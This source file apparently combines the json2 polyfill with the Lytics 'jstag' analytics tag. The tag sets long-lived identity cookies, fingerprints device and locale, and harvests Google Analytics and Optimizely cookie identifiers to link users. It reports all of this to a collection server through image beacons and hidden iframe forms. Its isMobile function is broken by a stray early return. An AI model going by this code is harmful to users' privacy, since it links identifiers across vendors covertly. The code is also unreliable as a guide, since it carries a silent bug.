/* istanbul ignore next */
"object"!=typeof JSON&&(JSON={}),function(){"use strict";function f(t){return 10>t?"0"+t:t}function this_value(){return this.valueOf()}function quote(t){return rx_escapable.lastIndex=0,rx_escapable.test(t)?'"'+t.replace(rx_escapable,function(t){var e=meta[t];return"string"==typeof e?e:"\\u"+("0000"+t.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+t+'"'}function str(t,e){var r,n,o,u,f,a=gap,i=e[t];switch(i&&"object"==typeof i&&"function"==typeof i.toJSON&&(i=i.toJSON(t)),"function"==typeof rep&&(i=rep.call(e,t,i)),typeof i){case"string":return quote(i);case"number":return isFinite(i)?String(i):"null";case"boolean":case"null":return String(i);case"object":if(!i)return"null";if(gap+=indent,f=[],"[object Array]"===Object.prototype.toString.apply(i)){for(u=i.length,r=0;u>r;r+=1)f[r]=str(r,i)||"null";return o=0===f.length?"[]":gap?"[\n"+gap+f.join(",\n"+gap)+"\n"+a+"]":"["+f.join(",")+"]",gap=a,o}if(rep&&"object"==typeof rep)for(u=rep.length,r=0;u>r;r+=1)"string"==typeof rep[r]&&(n=rep[r],o=str(n,i),o&&f.push(quote(n)+(gap?": ":":")+o));else for(n in i)Object.prototype.hasOwnProperty.call(i,n)&&(o=str(n,i),o&&f.push(quote(n)+(gap?": ":":")+o));return o=0===f.length?"{}":gap?"{\n"+gap+f.join(",\n"+gap)+"\n"+a+"}":"{"+f.join(",")+"}",gap=a,o}}var rx_one=/^[\],:{}\s]*$/,rx_two=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,rx_three=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,rx_four=/(?:^|:|,)(?:\s*\[)+/g,rx_escapable=/[\\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,rx_dangerous=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},Boolean.prototype.toJSON=this_value,Number.prototype.toJSON=this_value,String.prototype.toJSON=this_value);var gap,indent,meta,rep;"function"!=typeof JSON.stringify&&(meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},JSON.stringify=function(t,e,r){var n;if(gap="",indent="","number"==typeof r)for(n=0;r>n;n+=1)indent+=" ";else"string"==typeof r&&(indent=r);if(rep=e,e&&"function"!=typeof e&&("object"!=typeof e||"number"!=typeof e.length))throw new Error("JSON.stringify");return str("",{"":t})}),"function"!=typeof JSON.parse&&(JSON.parse=function(text,reviver){function walk(t,e){var r,n,o=t[e];if(o&&"object"==typeof o)for(r in o)Object.prototype.hasOwnProperty.call(o,r)&&(n=walk(o,r),void 0!==n?o[r]=n:delete o[r]);return reviver.call(t,e,o)}var j;if(text=String(text),rx_dangerous.lastIndex=0,rx_dangerous.test(text)&&(text=text.replace(rx_dangerous,function(t){return"\\u"+("0000"+t.charCodeAt(0).toString(16)).slice(-4)})),rx_one.test(text.replace(rx_two,"@").replace(rx_three,"]").replace(rx_four,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();
(function iife(window$2, undefined) {
    'use strict';
    var location = window$2.location;
    var document = window$2.document;
    var navigator = window$2.navigator;
    var screen = window$2.screen;
    var userAgent = navigator.userAgent;
    var ioVersion = '2.1.0';
    var DEFAULT_COOKIE_NAME = 'seerid';
    var DEFAULT_SESSION_COOKIE_NAME = 'seerses';
    var arraySlice = uncurryThis([].slice);
    var keys = Object.keys || function keys$2(source) {
        return filter(allKeys(source), function (key) {
            return {}.hasOwnProperty.call(source, key);
        });
    };
    function getConfig(config) {
        var mergedConfig = extend({
            url: '//c.lytics.io',
            location: location.href,
            payloadQueue: [],
            id: undefined,
            cid: undefined,
            loadid: undefined,
            serializer: defaultSerializer,
            delay: 2000,
            blockload: false,
            path: '/c/',
            idpath: '/cid/',
            cookie: DEFAULT_COOKIE_NAME,
            sesname: DEFAULT_SESSION_COOKIE_NAME,
            stream: undefined,
            sessecs: 1800,
            qsargs: [],
            ref: true,
            tagid: 'jstag-csdk',
            pagedata: {},
            version: ioVersion
        }, config);
        if (mergedConfig.cid) {
            // normalize `cid` so that it's always an array:
            mergedConfig.cid = [].concat(mergedConfig.cid);
        }
        return mergedConfig;
    }
    var transports = {
        /**
   * @constructor transports.Gif
   * @private
   * @todo fix documentation
   * @todo add a description
   */
        Gif: function GifTransport(config) {
            return {
                name: 'Gif',
                send: function GifTransport$send(url, message) {
                    var image = new Image();
                    var callback = once(message.callback);
                    image.onload = callback;
                    later(callback, config.delay);
                    image.src = appendQuery(url, message.dataMsg);
                }
            };
        },
        /**
   * @constructor transports.Form
   * @private
   * @todo fix documentation
   * @todo add a description
   */
        Form: function FormTransport(config) {
            return {
                name: 'Form',
                send: function FormTransport$send(url, message) {
                    var iframe = html('iframe', { id: uid() });
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    asap(function () {
                        var childDocument = iframe.contentWindow.document;
                        var form = html('form', {
                            action: url,
                            method: 'post'
                        }, childDocument);
                        var input = html('input', {
                            value: message.dataMsg,
                            type: 'hidden',
                            name: '_js'
                        }, childDocument);
                        form.appendChild(input);
                        childDocument.body.appendChild(form);
                        form.submit();
                        later(function () {
                            attempt(function () {
                                document.body.removeChild(iframe);
                            });
                            if (isFunction(message.callback)) {
                                message.callback();
                            }
                        }, config.delay);
                    });
                }
            };
        }
    };
    function JSTag(config) {
        this.config = getConfig(config);
        this.referrer = getReferrer();
        this.pageData = {};
        this.blocked = false;
        this.changeId = null;
        /** @deprecated */
        this.listeners = {};
    }
    JSTag.prototype = {
        constructor: JSTag,
        /**
   * @public
   * @method
   * @todo add a description
   */
        getid: function getid(callback) {
            var that = this;
            var wrappedCallback = once(function (id) {
                that.setid(id);
                callback(id);
            });
            var seerId = getCookie(this.config.cookie);
            if (seerId && seerId.length) {
                asap(wrappedCallback, seerId);
            } else if (this.config.loadid) {
                asap(jsonpGetId, this, wrappedCallback);
            } else {
                asap(makeId, wrappedCallback);
            }
        },
        /**
   * @public
   * @method
   * @todo add a description
   */
        setid: function setid(id) {
            var cookieName = this.config.cookie;
            var oldId = getCookie(cookieName);
            if (oldId && oldId.length) {
                this.changeId = oldId;
            }
            setCookie(cookieName, id);
        },
        /**
   * Clears both cookies by name
   *
   * @public
   * @method
   */
        clearCookies: function clearCookies() {
            deleteCookie(this.config.cookie);
            deleteCookie(this.config.sesname);
        },
        /**
   * @public
   * @method
   * @param {string} [stream] - the Lytics stream name
   * @param {Object} [data] - the payload to collect
   * @param {Function} [callback] - a callback to call once the message is
   *     processed
   * @returns the normalized options hash
   * @todo add a description
   */
        parseEvent: function parseEvent() {
            var length = arguments.length;
            var args = new Array(length);
            for (var i = 0; i < length; i++) {
                args[i] = arguments[i];
            }
            return normalizeEventArgs(args);
        },
        /**
   * @public
   * @method
   * @returns {JSTag} the instance
   * @todo add a description
   */
        block: function block(timeout) {
            if (this.blocked) {
                return this;
            }
            var that = this;
            // this.config.blockload exists for backwards compatibility
            this.blocked = this.config.blockload = true;
            if (!isNumber(timeout)) {
                timeout = 2000;
            }
            later(function () {
                that.unblock();
            }, timeout);
            return this;
        },
        /**
   * @public
   * @method
   * @returns {JSTag} the instance
   * @todo add a description
   */
        unblock: function unblock() {
            if (!this.blocked) {
                return this;
            }
            var that = this;
            // this.config.blockload exists for backwards compatibility
            this.blocked = this.config.blockload = false;
            forEach(this.config.payloadQueue, function (message) {
                that.sendMessage(message);
            });
            this.config.payloadQueue.length = 0;
            return this;
        },
        /**
   * Send a message
   *
   * @private
   * @param {Object} the message to send
   * @param {boolean} isMock if passed, don't actually do any I/O
   * @throws {TypeError}
   */
        sendMessage: function sendMessage(message, isMock) {
            isMock == null && (isMock = false);
            var that = this;
            var config = this.config;
            if (!config.url || !config.cid) {
                throw new TypeError('Must have collection url and ProjectIds (cid)');
            }
            if (this.blocked && !isMock) {
                config.payloadQueue.push(message);
                return;
            }
            if (isMock) {
                if (message.callback == null) {
                    throw new TypeError('cannot call mock without a callback');
                }
                var memo = message.data;
                forEach(config.payloadQueue, function (item) {
                    extend(memo, item.data);
                });
            }
            message.stream || (message.stream = config.stream);
            forEach(this.config.cid, function (cid) {
                var url = getEndpoint(config, cid) + (message.stream ? '/' + message.stream : '');
                if (// [compat 6] Internet Explorer has no `Array.prototype.indexOf`, so
                    //     `contains` can't be generic. Just use `String.prototype.indexOf`
                    url.indexOf('_uidn=') === -1 && config.cookie !== DEFAULT_COOKIE_NAME) {
                    url = appendQuery(url, '_uidn=' + config.cookie);
                }
                message.data._ts = now();
                collectIdentity(message, config, that);
                that.getid(function (id) {
                    if (id && !message.data._uid) {
                        message.data._uid = id;
                        message.data._getid = 't';
                    }
                    that.ioCollect(message, url, isMock);
                });
            });
        },
        /**
   * @private
   * @method
   * @param {Object} message
   * @param {string} url
   * @param {boolean} isMock
   * @todo add a description
   */
        ioCollect: function ioCollect(message, url, isMock) {
            var that = this;
            var config = this.config;
            this.onSendStarted(message);
            message.dataMsg = config.serializer(extend({}, message.data));
            message.sendurl || (message.sendurl = []);
            message.sendurl.unshift(url);
            if (isMock) {
                asap(message.callback, message, this);
                return;
            }
            var transport = this.ioGetTransport(message, url);
            // NOTE: this seems unnecessary, and exists only for backwards compatibility.
            message.channelName = transport.name;
            transport.send(url, extend({}, message, {
                callback: function collectCallback() {
                    if (isFunction(message.callback)) {
                        message.callback(message, that);
                    }
                    that.onSendFinished(message);
                }
            }));
        },
        /**
   * @private
   * @method
   * @param {Object} message
   * @param {string} url
   * @todo add a description
   */
        ioGetTransport: function ioGetTransport(message, url) {
            var config = this.config;
            if (message.dataMsg.length + url.length > 2000) {
                return new transports.Form(config);
            }
            return new transports.Gif(config);
        },
        /**
   * @public
   * @method
   * @param {string} [stream] - the Lytics stream name
   * @param {Object} [data] - the payload to collect
   * @param {Function} [callback] - a callback to call once the message is
   *     processed
   * @todo add a description
   */
        send: send,
        identify: send,
        /**
   * @public
   * @method
   * @param {string} [stream] - the Lytics stream name
   * @param {Object} [data] - the payload to collect
   * @param {Function} [callback] - a callback to call once the message is
   * @todo add a description
   */
        mock: mock,
        /**
   * @public
   * @method
   * @param {string} [stream] - the Lytics stream name
   * @param {Object} [data] - the payload to collect
   * @param {Function} [callback] - a callback to call once the message is
   *     processed
   * @todo add a description
   */
        page: page,
        pageView: page,
        /**
   * @public
   * @method
   * @todo add a description
   */
        pageAnalysis: function pageAnaylsis() {
            var config = this.config;
            var sessionCookie = getCookie(config.sesname);
            var pageData = this.pageData;
            var uri = parseUri(config.location);
            if (uri.search.length > 0) {
                var queryParams = parseQueryString(uri.search);
                // `utm_` prefixes are generic tracking-related parameters
                extend(pageData, filterObject(queryParams, function (tuple) {
                    return startsWith(tuple[0], 'utm_');
                }));
                if (config.qsargs && config.qsargs.length > 0) {
                    extend(pageData, filterObject(queryParams, function (tuple) {
                        return contains(config.qsargs, tuple[0]);
                    }));
                }
            }
            if (!sessionCookie) {
                pageData._sesstart = '1';
            }
            var referrer = this.referrer;
            if (referrer && referrer.length > 0) {
                var referrerHost = /\/\/(.*)\//.exec(referrer);
                if (referrerHost && !contains(referrerHost[1], location.host)) {
                    var strippedReferrer = stripProtocol(referrer);
                    pageData._ref = strippedReferrer;
                    if (!sessionCookie) {
                        pageData._sesref = strippedReferrer;
                    }
                }
            }
            setCookie(config.sesname, 'e', config.sessecs);
            pageData._tz = parseInt(-new Date().getTimezoneOffset() / 60, 10);
            pageData._ul = navigator.language || navigator.userLanguage;
            if (screen) {
                pageData._sz = screen.width + 'x' + screen.height;
            }
            this.pageData = pageData;
        },
        /**
   * Make a JSONP request
   *
   * @param {string} url
   * @param {Function} callback
   */
        jsonp: function jsonp(url, callback) {
            var callbackId = uid();
            var script = html('script', { src: appendQuery(url, 'callback=' + callbackId) });
            window$2[callbackId] = once(function () {
                window$2[callbackId] = undefined;
                attempt(function () {
                    document.body.removeChild(script);
                });
                script = undefined;
                callback.apply(null, arguments);
            });
            document.body.appendChild(script);
        },
        /**
   * Extend an object, optionally using a deep merge
   *
   * @public
   * @method
   * @param {boolean} [isDeep] - extend using deep-merge semantics
   * @param {Object} target - the object to copy params to
   * @param {...Object} sources - the objects to copy properties from
   * @returns target
   */
        extend: extend,
        /**
   * Parse a URI using the browser's native capabilities
   *
   * @public
   * @method
   * @param {string} uri
   * @returns {Object} the parsed uri
   */
        parseUri: parseUri,
        /**
   * Parse a query string
   *
   * @public
   * @method
   * @param {string} queryString
   * @returns {Object} the parsed query string
   */
        parseQueryString: parseQueryString,
        /**
   * Get a cookie value, which can be of any serializable type
   *
   * @public
   * @method
   * @param {string} name
   * @returns {any} - the stored value
   */
        getCookie: getCookie,
        /**
   * Set a cookie with a value of any serializable type
   *
   * @public
   * @method
   * @param {string} name - the cookie name
   * @param {any} value - the cookie value
   * @param {number} seconds - the seconds until expiration relative from now
   */
        setCookie: setCookie,
        /**
   * Delete a cookie
   *
   * @public
   * @method
   * @param {string} name
   */
        deleteCookie: deleteCookie,
        /**
   * @event
   */
        onIoReady: noop,
        /**
   * @event
   */
        onSendStarted: noop,
        /**
   * @event
   */
        onSendFinished: noop
    };
    function send() {
        var length = arguments.length;
        var args = new Array(length);
        for (var i = 0; i < length; i++) {
            args[i] = arguments[i];
        }
        this.sendMessage(normalizeEventArgs(args));
    }
    function page() {
        var length = arguments.length;
        var args = new Array(length);
        for (var i = 0; i < length; i++) {
            args[i] = arguments[i];
        }
        var message = normalizeEventArgs(args);
        message.data = extend({ _e: 'pv' }, this.pageData, message.data);
        this.sendMessage(message);
    }
    function mock() {
        var length = arguments.length;
        var args = new Array(length);
        for (var i = 0; i < length; i++) {
            args[i] = arguments[i];
        }
        var message = normalizeEventArgs(args);
        message.data = extend({ _e: 'mk' }, this.pageData, message.data);
        this.sendMessage(message, true);
    }
    function collectIdentity(message, config, instance) {
        var data = message.data;
        if (isMobile()) {
            data._mob = 't';
            var mobType = 'unknown';
            if (/Android/i.test(userAgent)) {
                mobType = 'Android';
            } else if (/BlackBerry/i.test(userAgent)) {
                mobType = 'Blackberry';
            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                mobType = 'IOS';
            } else if (/IEMobile/i.test(userAgent)) {
                mobType = 'WinMobile';
            }
            data._device = mobType;
        } else {
            data._nmob = 't';
            data._device = 'desktop';
        }
        // get location
        data.url = stripProtocol(location.href);
        if (isIFrame()) {
            data._if = 't';
        }
        if (// clean up uid
            '_uid' in data && !data._uid) {
            delete data._uid;
        }
        var // collect google analytics entropy:
        googleAnalyticsCookie = getCookie('__utma');
        if (// this is here to support an experiment with collecting potentially
            //     user-identifying entropy
            googleAnalyticsCookie && googleAnalyticsCookie.length > 10) {
            data._ga = googleAnalyticsCookie.substring(0, googleAnalyticsCookie.indexOf('.', 10));
        }
        if (!('_uid' in data)) {
            var seerId = getCookie(config.cookie);
            if (seerId && seerId.length) {
                data._uid = seerId;
            }
        }
        var optimizelyCookie = getCookie('optimizelyEndUserId');
        if (optimizelyCookie) {
            data.optimizelyid = optimizelyCookie;
        }
        if (!('_v' in data)) {
            data._v = ioVersion;
        }
        if (instance && instance.changeId) {
            data._uido = instance.changeId;
        }
    }
    function defaultSerializer(data, namespace) {
        namespace || (namespace = '');
        var result = [];
        if (!isObject(data)) {
            result.push(namespace + '=' + data);
        } else if (isArray(data)) {
            result.push(namespace + '_len=' + data.length, namespace + '_json=' + encodeURIComponent(JSON.stringify(data)));
            forEach(data, function (datum) {
                result.push(defaultSerializer(datum, namespace));
            });
        } else {
            forEach(keys(data), function (plainKey) {
                var key = encodeURIComponent(plainKey);
                var datum = data[plainKey];
                if (// Don't attempt to serialize functions
                    isFunction(datum)) {
                    return;
                }
                if (namespace !== '') {
                    key = [
                        namespace,
                        key
                    ].join('.');
                }
                if (isObject(datum)) {
                    result.push(defaultSerializer(datum, key));
                } else if (isString(datum) && datum.length > 0 || datum != null) {
                    result.push(key + '=' + encodeURIComponent(datum));
                }
            });
        }
        return result.join('&');
    }
    function html(elementName, properties, doc) {
        doc || (doc = window$2.document);
        return extend(doc.createElement(elementName), properties);
    }
    function attempt() {
        var err = null;
        for (var i = 0, len = arguments.length; i < len; i++) {
            try {
                return arguments[i](err);
            } catch (e) {
                err = e;
            }
        }
    }
    function makeId(callback) {
        callback(uid());
    }
    function isMobile() {
        var a = navigator.userAgent || navigator.vendor || window$2.opera;
        return;
        /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4));
    }
    function isIFrame() {
        return attempt(function () {
            return window$2.self !== window$2.top;
        }, function () {
            return true;
        });
    }
    var
    /**
 * @private
 * @member later.timers
 */
    laterTimers = [];
    function clearTimers() {
        forEach(laterTimers, clearTimeout);
        laterTimers.length = 0;
    }
    function later(callback, delay) {
        var length = arguments.length;
        var start = Math.min(2, length - 1);
        var args = new Array(length - start);
        for (var i = start; i < length; i++) {
            args[i - start] = arguments[i];
        }
        var // [compat 3] setTimeout.apply doesn't exist in IE :facepalm:
        timer = setTimeout(function () {
            callback.apply(null, args);
        }, delay);
        laterTimers.push(timer);
        return timer;
    }
    function asap(callback) {
        var length = arguments.length;
        var start = Math.min(1, length - 1);
        var args = new Array(length - start);
        for (var i = start; i < length; i++) {
            args[i - start] = arguments[i];
        }
        // should we feature detect for other techniques?
        later.apply(null, [
            callback,
            0
        ].concat(args));
    }
    function extend() {
        var length = arguments.length;
        var sources = new Array(length);
        for (var i = 0; i < length; i++) {
            sources[i] = arguments[i];
        }
        var isDeep = false;
        if (isBoolean(sources[0])) {
            isDeep = true;
            sources = sources.slice(1);
        }
        return reduce(sources, function (target, source) {
            if (source === undefined) {
                return target;
            }
            forEach(keys(source), function (key) {
                if (isDeep && isObject(source[key])) {
                    target[key] = extend(true, target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            });
            return target;
        });
    }
    function jsonpGetId(context, callback) {
        var config = context.config;
        var idUri = getEndpoint(config, config.cid[0], 'idpath');
        context.jsonp(idUri, callback);
    }
    function getReferrer() {
        return attempt(function () {
            return top.document.referrer;
        }, function () {
            return parent.document.referrer;
        }, function () {
            return document.referrer;
        });
    }
    function stripProtocol(url) {
        return url.replace(/^https?:\/\//, '');
    }
    function once(callback) {
        return function () {
            if (callback != null) {
                callback.apply(null, arguments);
                callback = null;
            }
        };
    }
    function forEach(collection, callback) {
        for (var i = 0, len = collection.length; i < len; i++) {
            callback(collection[i], i, collection);
        }
    }
    function indexOf(collection, item) {
        for (var i = 0, len = collection.length; i < len; i++) {
            if (collection[i] === item) {
                return i;
            }
        }
        return -1;
    }
    function reduce(collection, combine, memo) {
        var i = -1;
        var len = collection.length;
        if (arguments.length === 2 && len) {
            memo = collection[++i];
        }
        while (++i < len) {
            memo = combine(memo, collection[i], i, collection);
        }
        return memo;
    }
    function map(collection, transform) {
        return reduce(collection, function (memo, item, i) {
            memo.push(transform(item, i, collection));
            return memo;
        }, []);
    }
    function filter(collection, predicate) {
        return reduce(collection, function (memo, element, i) {
            if (predicate(element, i, collection)) {
                memo.push(element);
            }
            return memo;
        }, []);
    }
    function pairs(source) {
        return reduce(keys(source), function (memo, key) {
            memo.push([
                key,
                source[key]
            ]);
            return memo;
        }, []);
    }
    function object(source) {
        return reduce(source, function (memo, pair) {
            memo[pair[0]] = pair[1];
            return memo;
        }, {});
    }
    function filterObject(source, predicate) {
        return object(filter(pairs(source), predicate));
    }
    function contains(haystack, needle) {
        return indexOf(haystack, needle) !== -1;
    }
    function trim(str) {
        return str.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, '');
    }
    function startsWith(haystack, needle) {
        return haystack.indexOf(needle) === 0;
    }
    function allKeys(obj) {
        var result = [];
        for (var /* eslint-disable guard-for-in */
                key in obj) {
            result.push(key);
        }
        /* eslint-enable guard-for-in */
        return result;
    }
    function isFunction(it) {
        return 'function' === typeof it;
    }
    function isBoolean(it) {
        return 'boolean' === typeof it;
    }
    function isObject(it) {
        return it && 'object' === typeof it;
    }
    function isArray(it) {
        return '[object Array]' === {}.toString.call(it);
    }
    function isString(it) {
        return 'string' === typeof it;
    }
    function isNumber(it) {
        return 'number' === typeof it;
    }
    function getCookie(name) {
        var re = new RegExp(name + '=([^;]+)');
        var value = re.exec(decodeURIComponent(document.cookie));
        return value && value[1];
    }
    function deleteCookie(name) {
        setCookie(name, '', -60);
    }
    function setCookie(name, value, seconds) {
        seconds || (seconds = 90 * 24 * 60 * 60);
        var // 90 days
        expires = getExpirationDate(seconds);
        var domain = parseUri(location).hostname;
        var cookieValue = name + '=' + encodeURIComponent(value) + (// Note: valid cookies must have at least 2 dots in the domain! [compat]
        domain && domain.split('.').length > 1 ? '; domain=' + domain : '') + ('; expires=' + expires.toUTCString());
        document.cookie = cookieValue;
    }
    function getExpirationDate(seconds) {
        var date = new Date();
        date.setTime(date.getTime() + 1000 * seconds);
        return date;
    }
    function getEndpoint(config, cid, pathKey) {
        return '' + config.url + config[pathKey || 'path'] + cid;
    }
    function normalizeEventArgs(args) {
        var stream, data, callback;
        forEach(args, function (arg) {
            switch (typeof arg) {
            case 'string':
                stream = arg;
                break;
            case 'function':
                callback = arg;
                break;
            case 'object':
                data = arg;
                break;
            case 'boolean':
                deprecation('boolean argument is passed to send. Ignoring.');
                break;
            default:
                throw new TypeError('unable to process jstag.send event: ' + 'unknown value type (' + typeof arg + ')');
            }
        });
        if (data == null) {
            data = {};
        }
        return {
            stream: stream,
            data: data,
            callback: callback
        };
    }
    function appendQuery(url, query) {
        return url + (contains(url, '?') ? '&' : '?') + query;
    }
    function uncurryThis(method) {
        return function func() {
            return method.apply(arguments[0], [].slice.call(arguments, 1));
        };
    }
    function now() {
        return new Date().getTime();
    }
    function uid() {
        return 'u_' + Math.floor(Math.random() * 1000000000000000000);
    }
    /**
 * @private
 */
    function noop() {
    }
    noop();
    function deprecation(message) {
        /* eslint-disable no-console */
        console.warn('Deprecation warning: ' + message);
    }
    function parseUri(uri) {
        var parser = html('a', { href: uri });
        var stringValueKeys = filter(allKeys(parser), function (key) {
            var value = attempt(function () {
                // [compat 2] This lookup can throw in Internet Explorer :sadtaco:
                return parser[key];
            });
            if (value == null) {
                return false;
            }
            return isString(value);
        });
        var parsed = object(map(stringValueKeys, function (key) {
            return [
                key,
                parser[key]
            ];
        }));
        if (// [compat 1] Note: older browsers that don't support CORS won't have `origin`:
            parsed.origin == null) {
            parsed.origin = getUriOrigin(parsed);
        }
        return parsed;
    }
    function getUriOrigin(uri) {
        return uri.protocol + '//' + uri.hostname + (uri.port ? ':' + uri.port : '');
    }
    function parseQueryString(str) {
        var ret = {};
        if ('string' !== typeof str) {
            return ret;
        }
        str = trim(str).replace(/^(\?|#|&)/, '');
        if (!str) {
            return ret;
        }
        forEach(str.split('&'), function (param) {
            var parts = param.replace(/\+/g, ' ').split('=');
            var // Firefox (pre 40) decodes `%3D` to `=`
            // https://github.com/sindresorhus/query-string/pull/37
            key = parts.shift();
            var val = parts.length > 0 ? parts.join('=') : undefined;
            key = decodeURIComponent(key);
            // missing `=` should be `null`:
            // http://w3.org/TR/2012/WD-url-20120524/#collect-url-parameters
            val = val === undefined ? null : decodeURIComponent(val);
            if (ret[key] === undefined) {
                ret[key] = val;
            } else if (isArray(ret[key])) {
                ret[key].push(val);
            } else {
                ret[key] = [
                    ret[key],
                    val
                ];
            }
        });
        return ret;
    }
    var canonicalName = '__lytics__jstag__';
    var succinctName = function getSuccintGlobalName() {
        var scriptsHostObject = document.getElementsByTagName('script');
        var length = scriptsHostObject.length;
        var scripts = new Array(length);
        for (var i = 0; i < length; i++) {
            scripts[i] = scriptsHostObject[i];
        }
        var metasHostObject = document.getElementsByTagName('meta');
        var length$2 = metasHostObject.length;
        var metas = new Array(length$2);
        for (var i$2 = 0; i$2 < length$2; i$2++) {
            metas[i$2] = metasHostObject[i$2];
        }
        var attributes = filter(map(scripts.concat(metas), function (tag) {
            return tag.getAttribute('data-lytics-global');
        }), Boolean);
        if (attributes.length > 1) {
            throw new Error('This page specified more than one data-lytics-global attribute. ' + 'You should put the attribute on either a meta tag, or the script ' + 'element itself, but not both');
        }
        if (attributes.length === 1) {
            return attributes[0];
        }
        return 'jstag';
    }();
    /**
 * @exports window.jstag
 */
    window$2[canonicalName] || (window$2[canonicalName] = window$2[succinctName] || {});
    window$2[canonicalName].JSTag = JSTag;
    window$2[canonicalName].init = function facade() {
        var
        // Cache for the backing singleton instance
        instance;
        function expose(methodNames) {
            forEach(methodNames, function (methodName) {
                window$2[canonicalName][methodName] = function () {
                    return instance[methodName].apply(instance, arguments);
                };
            });
        }
        // Expose the singleton facade interface
        expose([
            'send',
            'mock',
            'identify',
            'page',
            'pageView',
            'block',
            'unblock',
            'parseEvent',
            'clearCookies'
        ]);
        // these properties are exposed for backwards compatibility:
        window$2[canonicalName].extend = extend;
        window$2[canonicalName].ckieGet = getCookie;
        window$2[canonicalName].ckieSet = setCookie;
        window$2[canonicalName].ckieDel = deleteCookie;
        window$2[canonicalName].isLoaded = false;
        window$2[canonicalName].util = {
            forEach: forEach,
            reduce: reduce,
            map: map,
            filter: filter,
            contains: contains,
            pairs: pairs,
            object: object,
            filterObject: filterObject,
            trim: trim,
            extend: extend,
            expose: expose,
            once: once,
            parseUri: parseUri,
            parseQueryString: parseQueryString
        };
        function reset() {
            if (instance) {
                instance.clearCookies();
            }
            // Do not fire any timers from a previously initialized instance.
            clearTimers();
        }
        return function init(config) {
            reset();
            instance = new JSTag(config);
            instance.pageAnalysis();
            // these properties are exposed for backwards compatibility:
            window$2[canonicalName].isLoaded = true;
            window$2[canonicalName].config = instance.config;
            return reset;
        };
    }();
    // Also export with a short-but-sweet name (usually "jstag")
    window$2[succinctName] = window$2[canonicalName];
    function toFastProperties(obj) {
        try {
            // This is here to hopefully prevent v8's optimizing compiler from removing this code:
            F.prototype = obj;
            return new F();
        } catch (e) {
        }
        function F() {
        }
    }
    toFastProperties(transports);
    toFastProperties(JSTag);
    toFastProperties(JSTag.prototype);
    toFastProperties(window$2[canonicalName]);
    toFastProperties(window$2[canonicalName].util);
}(window));